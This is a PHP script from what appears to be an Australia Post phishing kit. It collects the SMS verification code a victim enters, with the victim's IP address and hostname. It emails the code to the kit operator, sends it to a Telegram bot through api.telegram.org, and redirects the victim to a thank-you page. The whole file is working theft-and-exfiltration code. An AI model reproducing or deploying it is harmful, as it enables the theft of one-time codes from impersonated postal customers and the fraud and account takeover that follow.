<?php

error_reporting(0);
session_start();
include "../../config.php";
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;



$hostname = gethostbyaddr($ip);
$message = "[========== 🇦🇺 CH1 AUS POST RZLT(SMS 2) 🇦🇺 ===========]\r\n";
$message .= "|SMS       : ".$_POST['sms']."\r\n";

$message .= "[========= $ip ========]\r\n";
$send = $email; 
$subject = "(".$_SESSION["name"].") SMS 2 AUS POST RZLT $ip";
$headers = "From: [CH1_AUS POST **]<info@CH1.com>";
mail($send,$subject,$message,$headers);
file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );
echo"<script>location.replace('../thanks.php');</script>";


?>
